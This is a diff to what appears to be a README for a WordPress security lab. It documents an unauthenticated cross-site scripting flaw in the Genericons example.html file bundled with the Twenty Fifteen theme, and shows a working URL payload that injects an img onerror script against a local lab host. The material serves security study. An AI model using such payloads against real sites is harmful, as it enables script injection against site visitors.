@@ -60,15 +60,16 @@ Step by step:
 3. The code is executed when the user move his cursor over the link 
 
 # Wordpress exploit #3
-Type:
+Type: Unauthenticated Genericons Cross-Site Scripting
 
 Wordpress exploit demo
 
 <img src="exploit3.gif" width="800">
 
-Description:
+Description: Genericons packages included in the Twenty Fifteen theme had a vulnurable example.htnl file which provided oportunities for XSS attack
 
 Step by step:
+1. 
 
 ```html
 http://wpdistillery.vm/wp-content/themes/twentyfifteen/genericons/example.html#<img/src/onerror=alert("You_are_hacked!")>
